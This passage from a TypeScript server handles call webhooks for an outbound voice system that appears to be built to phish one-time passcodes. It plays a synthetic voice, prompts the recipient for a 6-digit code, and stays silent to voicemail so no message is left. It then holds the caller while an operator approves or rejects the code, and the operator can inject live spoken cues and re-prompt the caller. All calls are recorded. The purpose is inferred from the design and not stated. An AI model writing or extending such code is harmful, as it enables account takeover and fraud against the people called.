      description: `Playing synthetic voice to Live Human (${session.voice}): "${session.introGreeting}"`,
      data: { greeting: session.introGreeting, voice: session.voice },
    });

    addSessionEvent(session, {
      type: 'gather',
      title: `Prompting Live Human for ${session.numDigits}-Digit Code`,
      description: `Playing code prompt & listening for ${session.numDigits} digits + live voice.`,
    });
  } else {
    persistSessionsToDisk();
    broadcastEvent(session.id, 'session-update', session);
  }

  twiml.say({ voice: session.voice as any }, session.introGreeting);

  const gather = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf', 'speech'],
    speechTimeout: 'auto',
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 25,
  });
  gather.say({ voice: session.voice as any }, session.script);

  const gatherSecondChance = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf', 'speech'],
    speechTimeout: 'auto',
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 20,
  });
  gatherSecondChance.say(
    { voice: session.voice as any },
    `We have not received your entry yet. ${session.script}`
  );

  twiml.say({ voice: session.voice as any }, 'We did not receive your code. Thank you for your time. Goodbye.');
  twiml.hangup();
}

// Helper: Silent Voice/DTMF Listener (ZERO spoken prompts! Starts at call start & continues silently during Voicemail)
function populateSilentListenTwiml(
  twiml: twilio.twiml.VoiceResponse,
  session: CallSession,
  amdGateUrl: string,
  pauseSec: number
) {
  const silentGather = twiml.gather({
    action: amdGateUrl,
    method: 'POST',
    input: ['dtmf', 'speech'],
    speechTimeout: 'auto',
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: pauseSec,
  });
  silentGather.pause({ length: pauseSec });
  twiml.redirect({ method: 'POST' }, amdGateUrl);
}

// 1. XML Outbound Webhook - Call Connected (Listening for Voice/DTMF + Recording Starts Immediately at t=0s!)
//    CRITICAL RULE: NEVER play greeting or prompts to a Voicemail Machine! Only speak once a Live Human is confirmed.
app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Welcome to VoiceDrop Interactive. Session could not be found.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const incomingSid = req.body?.CallSid || req.body?.call_control_id;
  if (typeof incomingSid === 'string' && incomingSid.trim() && !session.providerCallSid) {
    session.providerCallSid = incomingSid.trim();
    providerSidToCallId.set(incomingSid.trim(), session.id);
  }

  if (!session.answeredAt) {
    session.answeredAt = new Date().toISOString();
  }
  session.status = 'in-progress';

  const rawAnsweredBy = req.body?.AnsweredBy || req.query?.AnsweredBy;
  const parsedAmd = parseAnsweredBy(rawAnsweredBy);
  if (parsedAmd) {
    void applyAmdResult(session, parsedAmd, String(rawAnsweredBy));
    if (parsedAmd === 'voicemail' && session.autoHangupOnVoicemail) {
      twiml.hangup();
      void finalizeCallRecording(session);
      res.type('text/xml');
      return res.send(twiml.toString());
    }
  }

  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
  const matchedGatherBase =
    XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
  const matchedGateBase =
    XML_AMD_GATE_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/amd-gate';
  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
  const amdGateUrl = `${appBaseUrl}${matchedGateBase}?callId=${encodeURIComponent(session.id)}`;

  addSessionEvent(session, {
    type: 'call-state',
    title: 'Call Connected — Listening for Voice/DTMF & Recording Active',
    description:
      session.answeredBy === 'human'
        ? `Live human confirmed on ${session.to}. Playing immediate pickup greeting.`
        : session.answeredBy === 'voicemail'
        ? `Voicemail machine answered on ${session.to}. Holding spoken prompts silent — listening in case a human picks up.`
        : `Listening for voice & keypad from start of call while verifying Live Human vs. Voicemail.`,
  });

  // Only speak immediately if carrier ALREADY confirmed Live Human synchronously
  if (session.answeredBy === 'human') {
    populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
  } else {
    session.status = 'collecting-input';
    persistSessionsToDisk();
    const waitSec = session.answeredBy === 'voicemail' ? 5 : 2;
    populateSilentListenTwiml(twiml, session, amdGateUrl, waitSec);
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

// 1a. Silent AMD & Post-Voicemail Human-Pickup Gate (Listens for Voice/DTMF from t=0s; starts greeting ONLY for Live Human!)
app.all(XML_AMD_GATE_ROUTES, async (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
  const matchedGatherBase =
    XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
  const matchedGateBase =
    XML_AMD_GATE_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/amd-gate';
  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
  const amdGateUrl = `${appBaseUrl}${matchedGateBase}?callId=${encodeURIComponent(session.id)}`;

  const rawDigitsParam = req.body.Digits ?? req.query.Digits;
  const rawDigits = rawDigitsParam ? String(rawDigitsParam).replace(/\D/g, '') : '';
  const speechParam = req.body.SpeechResult || req.body.Speech || req.query.SpeechResult;
  const confidenceParam = req.body.Confidence ? parseFloat(req.body.Confidence) : undefined;
  const expectedLen = session.numDigits || 6;

  if (typeof speechParam === 'string' && speechParam.trim()) {
    appendSpeechTranscript(
      session,
      speechParam,
      confidenceParam,
      session.answeredBy === 'voicemail' ? 'Voicemail Screening' : 'Pickup'
    );
  }

  // If recipient already typed the full code right at call start / wakeup, forward straight to gather handler!
  if (rawDigits.length >= expectedLen) {
    if (session.answeredBy === 'voicemail') {
      session.humanPickedUpAfterVoicemail = true;
    }
    await applyAmdResult(session, 'human', 'keypad_full_code_entry');
    session.promptsStarted = true;
    twiml.redirect(
      { method: 'POST' },
      `${gatherActionUrl}&Digits=${encodeURIComponent(rawDigits)}`
    );
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Case A: Voicemail Machine (or Fax) is currently on the line -> Stay SILENT unless a Live Human picks up!
  if (session.answeredBy === 'voicemail' || session.answeredBy === 'fax') {
    if (session.autoHangupOnVoicemail) {
      twiml.hangup();
      void finalizeCallRecording(session);
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    if (
      session.answeredBy === 'voicemail' &&
      checkHumanPickupOnVoicemail(session, speechParam, rawDigits)
    ) {
      session.humanPickedUpAfterVoicemail = true;
      await applyAmdResult(
        session,
        'human',
        rawDigits ? 'human_keypad_after_voicemail' : 'human_speech_after_voicemail'
      );
      populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Still voicemail: keep silent, continue recording & listening for human pickup up to ~65s, then hang up silently
    session.silentPollCount = (session.silentPollCount || 0) + 1;
    persistSessionsToDisk();
    if (session.silentPollCount > 12) {
      twiml.hangup();
      void finalizeCallRecording(session);
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    populateSilentListenTwiml(twiml, session, amdGateUrl, 5);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Case B: Direct Live Human already confirmed by async AMD
  if (session.answeredBy === 'human') {
    populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Case C: Initial pickup check (answeredBy is undefined or 'unknown')
  const elapsedSinceAnswer = session.answeredAt
    ? Date.now() - new Date(session.answeredAt).getTime()
    : 4000;
  const spokeLiveHumanGreeting =
    typeof speechParam === 'string' &&
    speechParam.trim().length > 0 &&
    !isVoicemailGreetingSpeech(speechParam);

  if (
    rawDigits.length > 0 ||
    spokeLiveHumanGreeting ||
    session.answeredBy === 'unknown' ||
    elapsedSinceAnswer >= 3200
  ) {
    await applyAmdResult(
      session,
      'human',
      rawDigits.length > 0
        ? 'keypad_pickup'
        : spokeLiveHumanGreeting
        ? 'live_human_speech'
        : 'direct_human_pickup'
    );
    populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Wait one more brief silent beat for async AMD to finish (< 3.2s)
  populateSilentListenTwiml(twiml, session, amdGateUrl, 2);
  res.type('text/xml');
  res.send(twiml.toString());
});

// 1a-2. Direct Human Start Endpoint (invoked immediately when async AMD or Operator confirms Live Human!)
app.all(XML_HUMAN_START_ROUTES, async (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
  const matchedGatherBase =
    XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;

  if (session.answeredBy !== 'human') {
    await applyAmdResult(session, 'human', 'live_human_confirmed');
  }
  populateHumanGreetingTwiml(twiml, session, gatherActionUrl);

  res.type('text/xml');
  res.send(twiml.toString());
});

// 1b. Live Operator Cue during Gather - Speaks operator cue and resumes listening for DTMF & Speech
app.all(XML_CUE_GATHER_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
  const matchedBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
  const gatherActionUrl = `${appBaseUrl}${matchedBase}?callId=${encodeURIComponent(session.id)}`;

  if (session.activeCue?.text) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    persistSessionsToDisk();
    twiml.say({ voice: session.voice as any }, cueMsg);
  }

  const gather = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf', 'speech'],
    speechTimeout: 'auto',
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 25,
  });
  gather.pause({ length: 1 });

  twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
  twiml.hangup();

  session.status = 'collecting-input';
  persistSessionsToDisk();
  res.type('text/xml');
  res.send(twiml.toString());
});

// 2. XML Gather Callback - Captures Speech AND/OR Keypad Digits
//    CRITICAL RULE: ONLY play holdMessage ("Kindly hold while your information is being processed.")
//    AFTER the full keypad code has been inputted by the user!
app.all(XML_GATHER_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const rawDigitsParam = req.body.Digits ?? req.query.Digits;
  const speechParam = req.body.SpeechResult || req.body.Speech || req.query.SpeechResult;
  const confidenceParam = req.body.Confidence ? parseFloat(req.body.Confidence) : undefined;
  const twiml = new twilio.twiml.VoiceResponse();
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  const matchedWaitBase = XML_WAIT_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/wait-operator';
  const matchedGatherBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Thank you. Goodbye.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
  const expectedLen = session.numDigits || 6;

  // Record any spoken words uttered by the caller
  if (typeof speechParam === 'string' && speechParam.trim()) {
    appendSpeechTranscript(session, speechParam, confidenceParam);
  }

  const rawDigits = rawDigitsParam ? String(rawDigitsParam).replace(/\D/g, '') : '';

  // Case A: Caller ONLY spoke (no keypad digits pressed yet) -> DO NOT play holdMessage! Keep listening for keypad code & speech
  if (!rawDigits) {
    session.status = 'collecting-input';
    persistSessionsToDisk();

    const gatherContinue = twiml.gather({
      action: gatherActionUrl,
      method: 'POST',
      input: ['dtmf', 'speech'],
      speechTimeout: 'auto',
      numDigits: expectedLen,
      finishOnKey: '#',
      timeout: 25,
    });
    gatherContinue.pause({ length: 1 });

    const gatherReminder = twiml.gather({
      action: gatherActionUrl,
      method: 'POST',
      input: ['dtmf', 'speech'],
      speechTimeout: 'auto',
      numDigits: expectedLen,
      finishOnKey: '#',
      timeout: 20,
    });
    gatherReminder.say({ voice: session.voice as any }, session.script);

    twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
    twiml.hangup();

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Case B: Caller started typing digits, but paused before entering all expected digits -> DO NOT play holdMessage yet!
  if (rawDigits.length < expectedLen) {
    session.status = 'collecting-input';
    addSessionEvent(session, {
      type: 'dtmf',
      title: `Partial Digits Entered: [${rawDigits}] (${rawDigits.length}/${expectedLen})`,
      description: `Caller entered ${rawDigits.length} of ${expectedLen} digits. Prompting for full ${expectedLen}-digit code before placing on hold.`,
      data: { partialDigits: rawDigits, expectedLen },
    });

    const gatherFull = twiml.gather({
      action: gatherActionUrl,
      method: 'POST',
      input: ['dtmf', 'speech'],
      speechTimeout: 'auto',
      numDigits: expectedLen,
      finishOnKey: '#',
      timeout: 25,
    });
    gatherFull.say(
      { voice: session.voice as any },
      `We received ${rawDigits.length} digits. Please enter your full ${expectedLen}-digit code on your keypad now, followed by the pound sign.`
    );

    twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
    twiml.hangup();

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Case C: Full keypad code HAS been inputted by user!
  const enteredCode = rawDigits.slice(0, expectedLen);

  // 1. MANUAL OPERATOR REVIEW MODE (Default) -> NOW play "Kindly hold while your information is being processed."
  if (session.verificationMode === 'manual') {
    session.pendingDigits = enteredCode;
    session.codeStatus = 'awaiting_operator';
    session.status = 'awaiting-operator';
    session.operatorDecision = 'pending';

    addSessionEvent(session, {
      type: 'dtmf',
      title: `Code Received: [${enteredCode}] — Awaiting Operator Decision`,
      description: `Recipient inputted ${enteredCode.length}-digit code. Playing post-code hold message while operator reviews.`,
      data: { digits: enteredCode, verificationMode: 'manual' },
    });

    const holdPrompt = session.holdMessage || 'Kindly hold while your information is being processed.';
    const waitUrl = `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`;
    session.waitPollCount = 0;
    persistSessionsToDisk();

    twiml.say({ voice: session.voice as any }, holdPrompt);
    const holdGather = twiml.gather({
      action: waitUrl,
      method: 'POST',
      input: ['speech'],
      speechTimeout: 'auto',
      timeout: 2,
    });
    holdGather.pause({ length: 2 });
    twiml.redirect({ method: 'POST' }, waitUrl);

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 2. AUTOMATIC CODE MATCH MODE
  const isValid = !session.expectedCode || enteredCode === session.expectedCode.trim();

  if (!isValid) {
    session.attempts = (session.attempts || 0) + 1;
    session.lastInvalidDigits = enteredCode;
    session.codeStatus = 'invalid';

    const maxAttempts = session.maxAttempts || 3;

    if (session.attempts < maxAttempts) {
      addSessionEvent(session, {
        type: 'error',
        title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${enteredCode}]`,
        description: `Entered code "${enteredCode}" does not match expected "${session.expectedCode}". Playing retry voice prompt.`,
        data: { entered: enteredCode, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
      });

      twiml.say({ voice: session.voice as any }, session.invalidMessage || 'That code is incorrect. Please try again.');

      const gatherRetry = twiml.gather({
        action: gatherActionUrl,
        method: 'POST',
        input: ['dtmf', 'speech'],
        speechTimeout: 'auto',
        numDigits: expectedLen,
        finishOnKey: '#',
        timeout: 20,
      });
      gatherRetry.say({ voice: session.voice as any }, `Please enter your ${expectedLen}-digit code now, followed by the pound sign.`);

      twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
      twiml.hangup();

      session.status = 'collecting-input';
      res.type('text/xml');
      return res.send(twiml.toString());
    } else {
      session.status = 'failed';
      session.codeStatus = 'max_exceeded';
      session.completedAt = new Date().toISOString();

      addSessionEvent(session, {
        type: 'error',
        title: 'Verification Failed: Maximum Attempts Exceeded',
        description: `Recipient entered incorrect code ${session.attempts} times. Terminating call.`,
        data: { attempts: session.attempts, maxAttempts },
      });

      twiml.say({ voice: session.voice as any }, 'Maximum incorrect attempts exceeded. Goodbye.');
      twiml.hangup();
      void finalizeCallRecording(session);

      res.type('text/xml');
      return res.send(twiml.toString());
    }
  }

  // AUTO VALID
  session.capturedDigits = enteredCode;
  session.codeStatus = 'valid';
  session.status = 'completed';
  session.completedAt = new Date().toISOString();

  addSessionEvent(session, {
    type: 'dtmf',
    title: `Code Verified Valid: [${enteredCode}]`,
    description: `Recipient entered valid ${enteredCode.length}-digit code [${enteredCode}]. Playing confirmation message.`,
    data: { digits: enteredCode, expected: session.expectedCode },
  });

  const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
  twiml.say({ voice: session.voice as any }, confMsg);
  twiml.hangup();

  addSessionEvent(session, {
    type: 'playback',
    title: 'Confirmation Voice Prompt Played',
    description: `Playing synthetic voice (${session.voice}): "${confMsg}"`,
    data: { message: confMsg },
  });

  void finalizeCallRecording(session);

  res.type('text/xml');
  res.send(twiml.toString());
});

// 3. XML Wait Operator Loop (Listens for Caller Speech while Polling Operator Decision)
app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  const matchedWaitBase = XML_WAIT_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/wait-operator';
  const matchedGatherBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Session has ended. Goodbye.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Capture any speech spoken by caller while waiting on hold
  const holdSpeech = req.body?.SpeechResult || req.query?.SpeechResult;
  const holdConfidence = req.body?.Confidence ? parseFloat(req.body.Confidence) : undefined;
  if (typeof holdSpeech === 'string' && holdSpeech.trim()) {
    appendSpeechTranscript(session, holdSpeech, holdConfidence, 'On Hold');
  }

  const waitUrl = `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`;
  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;

  // Safety guard: never stay in hold loop if no keypad code has been submitted yet
  if (
    !session.pendingDigits &&
    !session.capturedDigits &&
    session.operatorDecision !== 'approved' &&
    session.operatorDecision !== 'rejected'
  ) {
    twiml.redirect({ method: 'POST' }, gatherActionUrl);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 1. Spoken cue from operator
  if (session.activeCue) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    persistSessionsToDisk();
    twiml.say({ voice: session.voice as any }, cueMsg);
    const cueListen = twiml.gather({
      action: waitUrl,
      method: 'POST',
      input: ['speech'],
      speechTimeout: 'auto',
      timeout: 2,
    });
    cueListen.pause({ length: 2 });
    twiml.redirect({ method: 'POST' }, waitUrl);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 2. Approved by operator
  if (session.operatorDecision === 'approved') {
    session.capturedDigits = session.pendingDigits || session.capturedDigits;
    session.pendingDigits = undefined;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    twiml.say({ voice: session.voice as any }, confMsg);
    twiml.hangup();

    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Message Played & Call Completed',
      description: `Playing synthetic voice: "${confMsg}"`,
    });

    void finalizeCallRecording(session);

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 3. Rejected by operator
  if (session.operatorDecision === 'rejected') {
    session.operatorDecision = undefined;
    session.status = 'collecting-input';
    persistSessionsToDisk();

    const retryMsg = session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.';
    twiml.say({ voice: session.voice as any }, retryMsg);

    const gatherRetry = twiml.gather({
      action: gatherActionUrl,
      method: 'POST',
      input: ['dtmf', 'speech'],
      speechTimeout: 'auto',
      numDigits: session.numDigits || 6,
      finishOnKey: '#',
      timeout: 25,
    });
    gatherRetry.say({ voice: session.voice as any }, `Please enter your ${session.numDigits}-digit code now, followed by the pound sign.`);

    twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
    twiml.hangup();

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 4. Fast 2-second hold poll loop with active speech listening
  session.waitPollCount = (session.waitPollCount || 0) + 1;
  persistSessionsToDisk();
  if (session.waitPollCount % 6 === 0) {
    twiml.say({ voice: session.voice as any }, 'Thank you for your patience. Please continue to hold.');
  }
  const waitGather = twiml.gather({
    action: waitUrl,
    method: 'POST',
    input: ['speech'],
    speechTimeout: 'auto',
    timeout: 2,
  });
  waitGather.pause({ length: 2 });
  twiml.redirect({ method: 'POST' }, waitUrl);

  res.type('text/xml');
  res.send(twiml.toString());
});

// 4. XML Status Callback
app.all(XML_STATUS_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);

  if (session) {
    const callStatus = req.body.CallStatus || req.body.call_status;
    const duration = req.body.CallDuration ? parseInt(req.body.CallDuration, 10) : undefined;
    const rawAnsweredBy = req.body.AnsweredBy || req.body.machine_detection_result;
    const parsedAmd = parseAnsweredBy(rawAnsweredBy);
    if (parsedAmd) {
      void applyAmdResult(session, parsedAmd, String(rawAnsweredBy));
    }

    if (duration !== undefined) session.duration = duration;

    if (callStatus === 'initiated' && session.status === 'queued') {
      session.status = 'initiating';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Carrier Status: Initiated',
        description: 'Outbound call leg initiated on PSTN gateway.',
      });
    } else if (callStatus === 'ringing' && ['queued', 'initiating'].includes(session.status)) {
      session.status = 'ringing';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Carrier Status: Ringing',
        description: 'Recipient device is actively alerting.',
      });
    } else if (callStatus === 'in-progress' && ['queued', 'initiating', 'ringing'].includes(session.status)) {
      session.status = 'in-progress';
      persistSessionsToDisk();
      broadcastEvent(session.id, 'session-update', session);
    } else if (callStatus === 'completed') {
      session.status = 'completed';
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Call Completed',
        description: `Session finished. Duration: ${duration || 0} seconds.`,
        data: { duration },
      });
      void finalizeCallRecording(session);
    } else if (['busy', 'no-answer', 'failed', 'canceled'].includes(callStatus)) {
      session.status = (callStatus === 'canceled' ? 'completed' : callStatus) as any;
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: `Call Ended (${callStatus})`,
        description: `Carrier returned status: ${callStatus}.`,
      });
      void finalizeCallRecording(session);
    }
  }

  res.sendStatus(200);
});

// 5. Answering Machine Detection (AMD) Callback (Twilio, Plivo, Telnyx, SignalWire)
app.all(XML_AMD_ROUTES, async (req: Request, res: Response) => {
  const session = findSession(req);
  if (session) {
    const rawAnsweredBy =
      req.body?.AnsweredBy ||
      req.body?.machine_detection_result ||
      req.body?.data?.payload?.result ||
      req.query?.AnsweredBy;
    const plivoMachine = req.body?.Machine ?? req.query?.Machine;
    const parsed = parseAnsweredBy(rawAnsweredBy, plivoMachine);
    if (parsed) {
      const label = String(
        rawAnsweredBy || (plivoMachine === 'true' ? 'plivo_machine' : 'plivo_human')
      );
      await applyAmdResult(session, parsed, label);

      // If async AMD confirmed a direct Live Human (or silent non-machine pickup 'unknown'),
      // immediately redirect the live call out of silent pause to start playing introGreeting + script!
      if (
        (parsed === 'human' || parsed === 'unknown') &&
        !session.promptsStarted &&
        session.answeredBy !== 'voicemail' &&
        session.answeredBy !== 'fax'
      ) {
        if (parsed === 'unknown') {
          await applyAmdResult(session, 'human', 'silent_live_human_pickup');
        }
        await redirectLiveCallToHumanStart(session);
      }
    }
  }
  res.sendStatus(200);
});

// 6. Call Recording Status Callback (Twilio, Plivo, Telnyx, SignalWire)
app.all(XML_RECORDING_ROUTES, async (req: Request, res: Response) => {
  const session = findSession(req);
  if (session) {
    const recUrl =
      req.body?.RecordingUrl ||
      req.body?.RecordUrl ||
      req.body?.recording_urls?.wav ||
      req.body?.recording_urls?.mp3 ||
      req.body?.data?.payload?.recording_urls?.wav ||
      req.body?.data?.payload?.recording_urls?.mp3 ||
      req.query?.RecordingUrl;
    const recSid = req.body?.RecordingSid || req.body?.RecordingID || req.body?.recording_id;
    const recStatus = (req.body?.RecordingStatus || req.body?.status || '').toLowerCase();
    const recDurationRaw = req.body?.RecordingDuration || req.body?.Duration;
    const recDuration = recDurationRaw ? parseInt(String(recDurationRaw), 10) : undefined;

    if (recSid) session.recordingSid = String(recSid);
    if (recDuration !== undefined && !Number.isNaN(recDuration) && recDuration > 0) {
      session.recordingDuration = recDuration;
    }

    if (recStatus === 'absent' || recStatus === 'failed') {
      if (!findCachedRecordingPath(session.id)) {
        session.recordingStatus = undefined;
        persistSessionsToDisk();
        broadcastEvent(session.id, 'session-update', session);
      }
    } else if (recStatus === 'in-progress') {
      if (!findCachedRecordingPath(session.id) && !['completed', 'failed', 'busy', 'no-answer'].includes(session.status)) {
        session.recordingStatus = 'recording';
        persistSessionsToDisk();
        broadcastEvent(session.id, 'session-update', session);
      }
    } else if (recUrl && (recStatus === 'completed' || !recStatus || req.body?.RecordUrl)) {
      session.providerRecordingUrl = String(recUrl);
      await downloadAndCacheRecording(session, String(recUrl));
    }
  }
  res.sendStatus(200);
});

// 7. Stream / Proxy Call Audio Recording for Instant Playback in Call History
app.get('/api/calls/:callId/recording', async (req: Request, res: Response) => {
  const session = getSessionById(req.params.callId);
  const safeId = req.params.callId;

  // 1. Serve cached local file with full HTTP byte-range support
  let cached = findCachedRecordingPath(safeId);

  // 2. If not cached yet, try downloading from providerRecordingUrl or querying Twilio Recordings API
  if (!cached && session) {
    let remoteUrl = session.providerRecordingUrl;

    if (!remoteUrl && session.carrier === 'twilio' && session.providerCallSid?.startsWith('CA')) {
      try {
        const creds = getCallCredentials(session.id);
        const sid = creds?.twilioSid || process.env.TWILIO_ACCOUNT_SID;
        const token = creds?.twilioToken || process.env.TWILIO_AUTH_TOKEN;
        if (sid && token) {
          const client = twilio(sid, token);
          const list = await client.recordings.list({ callSid: session.providerCallSid, limit: 1 });
          if (list.length > 0) {
            remoteUrl = `https://api.twilio.com/2010-04-01/Accounts/${sid}/Recordings/${list[0].sid}.wav?RequestedChannels=1`;
            session.providerRecordingUrl = remoteUrl;
            session.recordingSid = list[0].sid;
            if (list[0].duration) session.recordingDuration = parseInt(list[0].duration, 10) || undefined;
          }
        }
      } catch (err) {
        console.error('Error looking up Twilio recording:', err);
      }
    }

    if (remoteUrl) {
      await downloadAndCacheRecording(session, remoteUrl);
      cached = findCachedRecordingPath(session.id);
    }
  }

  if (!cached) {
    return res.status(404).json({ error: 'Call recording not available yet.' });
  }

  const stat = fs.statSync(cached.filePath);
  const fileSize = stat.size;
  const range = req.headers.range;

  if (req.query.download === '1') {
    res.setHeader(
      'Content-Disposition',
      `attachment; filename="voicedrop-${safeId}${path.extname(cached.filePath)}"`
    );
  }

  if (range) {
    const parts = range.replace(/bytes=/, '').split('-');
    const start = parseInt(parts[0], 10);
    const end = parts[1] ? parseInt(parts[1], 10) : fileSize - 1;
    const chunkSize = end - start + 1;
    const stream = fs.createReadStream(cached.filePath, { start, end });
    res.writeHead(206, {
      'Content-Range': `bytes ${start}-${end}/${fileSize}`,
      'Accept-Ranges': 'bytes',
      'Content-Length': chunkSize,
      'Content-Type': cached.mimeType,
    });
    stream.pipe(res);
  } else {
    res.writeHead(200, {
      'Content-Length': fileSize,
      'Accept-Ranges': 'bytes',
      'Content-Type': cached.mimeType,
    });
    fs.createReadStream(cached.filePath).pipe(res);
  }
});

// 8. Upload Browser Simulator Call / Microphone Recording (transcoded via ffmpeg to compact HD MP3)
app.post('/api/calls/:callId/recording-upload', async (req: Request, res: Response) => {
  const session = getSessionById(req.params.callId);
  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  const { audioBase64, mimeType = 'audio/webm', duration } = req.body || {};
  if (!audioBase64 || typeof audioBase64 !== 'string') {
    if (session.recordingStatus === 'recording' && !findCachedRecordingPath(session.id)) {
      session.recordingStatus = undefined;
      persistSessionsToDisk();
      broadcastEvent(session.id, 'session-update', session);
    }
    return res.json({ success: true, cleared: true, session });
  }

  try {
    const cleanBase64 = audioBase64.includes(',') ? audioBase64.split(',')[1] : audioBase64;
    const buffer = Buffer.from(cleanBase64, 'base64');
    if (buffer.length === 0) {
      if (session.recordingStatus === 'recording' && !findCachedRecordingPath(session.id)) {
        session.recordingStatus = undefined;
        persistSessionsToDisk();
        broadcastEvent(session.id, 'session-update', session);
      }
      return res.json({ success: true, cleared: true, session });
    }

    const lowerMime = String(mimeType).toLowerCase();
    const rawExt = lowerMime.includes('mp4')
      ? 'mp4'
      : lowerMime.includes('ogg')
      ? 'ogg'
      : lowerMime.includes('wav')
      ? 'wav'
      : lowerMime.includes('mpeg') || lowerMime.includes('mp3')
      ? 'mp3'
      : 'webm';

    const safeId = session.id.replace(/[^a-zA-Z0-9_-]/g, '');
